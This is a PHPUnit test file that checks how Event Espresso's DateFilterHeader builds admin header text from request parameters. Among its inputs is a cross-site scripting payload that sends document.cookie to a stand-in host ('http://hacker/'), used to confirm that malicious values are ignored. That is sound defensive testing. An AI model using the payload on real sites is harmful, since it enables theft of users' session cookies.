<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table\page_header;

use EE_Datetime;
use EE_Error;
use EEM_Datetime;
use EventEspresso\core\domain\services\admin\registrations\list_table\page_header\DateFilterHeader;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use InvalidArgumentException;
use PHPUnit\Framework\Exception;
use PHPUnit\Framework\TestCase;
use ReflectionException;

/**
 * @group AdminPageHeaderDecoratorTests
 */
class DateFilterHeaderTest extends TestCase
{

    /**
     * @var EE_Datetime $datetime
     */
    protected $datetime;

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';


    /**
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @since $VID:$
     */
    public function setUpDatetime()
    {
        $this->datetime = EE_Datetime::new_instance([
            'DTT_name' => 'Stephen Hawking’s Time Traveler Party',
            'DTT_EVT_start' => '2009-06-29 12:00:00',
            'DTT_EVT_end'   => '2009-06-29 16:00:00',
        ]);
        $saved = $this->datetime->save();
        $this->assertTrue($saved > 0);
    }


    /**
     * @param array $get_params
     * @return DateFilterHeader
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    private function getDateFilterHeader(array $get_params)
    {
        return new DateFilterHeader(
            new RequestMock($get_params, [], [], [], []),
            EEM_Datetime::instance()
        );
    }


    /**
     * returns following parameters:
     *      $get_params array of simulated $_GET params
     *      $event_text existing header text
     *      $expected   value of $header_text
     *
     * @return array
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @since  $VID:$
     */
    public function testDataProvider()
    {
        $this->setUpDatetime();
        return [
            // empty array
            [[], '', ''],
            // invalid keys
            [['DTT-ID' => $this->datetime->ID()], '', ''],
            [['datetime-id' => $this->datetime->ID()], '', ''],
            // invalid values
            [['DTT_ID' => '<h1>I am from the Future!!!</h1>'], '', ''],
            [['DTT_ID' => $this->xss], '', ''],
            [['datetime_id' => '<h1>I am from the Future!!!</h1>'], '', ''],
            [['datetime_id' => $this->xss], '', ''],
            [['DTT_ID' => '<h1>I am from the Future!!!</h1>'], 'Event Details', 'Event Details'],
            [['DTT_ID' => $this->xss], 'Event Details', 'Event Details'],
            [['datetime_id' => '<h1>I am from the Future!!!</h1>'], 'Event Details', 'Event Details'],
            [['datetime_id' => $this->xss], 'Event Details', 'Event Details'],
            // all good
            [['DTT_ID' => $this->datetime->ID()], '', ''],
            [
                ['DTT_ID' => $this->datetime->ID()],
                'Event Details',
                'Event Details&nbsp; &nbsp; <span class="drk-grey-text"><span class="dashicons dashicons-calendar"></span>Stephen Hawking’s Time Traveler Party ( September 24, 2019 )</span></h3>'
            ],
            [['datetime_id' => $this->datetime->ID()], '', ''],
            [
                ['datetime_id' => $this->datetime->ID()],
                'Event Details',
                'Event Details&nbsp; &nbsp; <span class="drk-grey-text"><span class="dashicons dashicons-calendar"></span>Stephen Hawking’s Time Traveler Party ( September 24, 2019 )</span></h3>'
            ],
        ];
    }


    /**
     * @dataProvider testDataProvider
     * @param array  $get_params
     * @param string $event_text
     * @param string $expected
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws ReflectionException
     * @since        $VID:$
     */
    public function testGetHeaderText(array $get_params, $event_text, $expected)
    {
        $datetime_filter_header = $this->getDateFilterHeader($get_params);
        $header_text = $datetime_filter_header->getHeaderText($event_text);
        $this->assertEquals($expected, $header_text);
    }
}
